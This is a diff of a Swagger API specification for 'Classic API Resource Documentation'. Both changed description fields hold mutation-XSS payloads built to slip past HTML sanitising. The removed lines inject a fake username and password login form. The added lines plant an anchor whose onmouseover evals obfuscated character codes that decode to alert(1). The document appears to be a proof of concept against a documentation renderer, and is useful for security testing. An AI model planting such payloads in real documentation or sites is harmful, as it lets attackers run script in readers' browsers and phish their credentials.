@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea></title> <form><div class="container"><label>Username : </label><input type="text" placeholder="Enter Username" name="username" required><label>Password : </label><input type="password" placeholder="Enter Password" name="password" required><button type="submit">Login</button><input type="checkbox" checked="checked"> Remember me<button type="button" class="cancelbtn"> Cancel</button>Forgot <a href="#"> password? </a></div></form>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><a onmouseover="eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))"\>Click me!</a>"></form>
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea></title> <form><div class="container"><label>Username : </label><input type="text" placeholder="Enter Username" name="username" required><label>Password : </label><input type="password" placeholder="Enter Password" name="password" required><button type="submit">Login</button><input type="checkbox" checked="checked"> Remember me<button type="button" class="cancelbtn"> Cancel</button>Forgot <a href="#"> password? </a></div></form>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><a onmouseover="eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))"\>Click me!</a>"></form>
 
           format: int64
           in: path
